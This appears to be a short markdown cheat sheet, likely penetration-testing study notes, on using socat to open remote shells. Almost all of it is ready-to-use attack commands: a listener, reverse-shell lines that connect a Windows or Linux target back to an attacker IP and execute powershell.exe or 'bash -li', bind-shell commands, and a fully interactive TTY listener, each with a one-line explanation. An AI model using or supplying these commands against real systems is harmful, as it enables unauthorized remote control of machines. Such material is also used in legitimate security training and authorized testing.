```bash

```

# Socat
Socat is similar to Netcat. It works as a connector between two points.

## Reverse Shells
### Syntax for A Listener/Attacker
* `socat TCP-L:<port> -` [ Two points (a listening port, and standard input) and connecting them together]
  
###  To Connect Back on A Windows Target
* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` [The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.]
###  To Connect Back on A Linux Target
* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind Shells
### On A Linux Target
* `socat TCP-L:<PORT> EXEC:"bash -li"`
### On A Windows Target
* `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
### Attacker (Regardless of target platform)
* `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

## A Fully Stable TTY Reverse Shell Using Socat
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
[ we are passing in the current TTY as a file and setting the echo to be zero.]

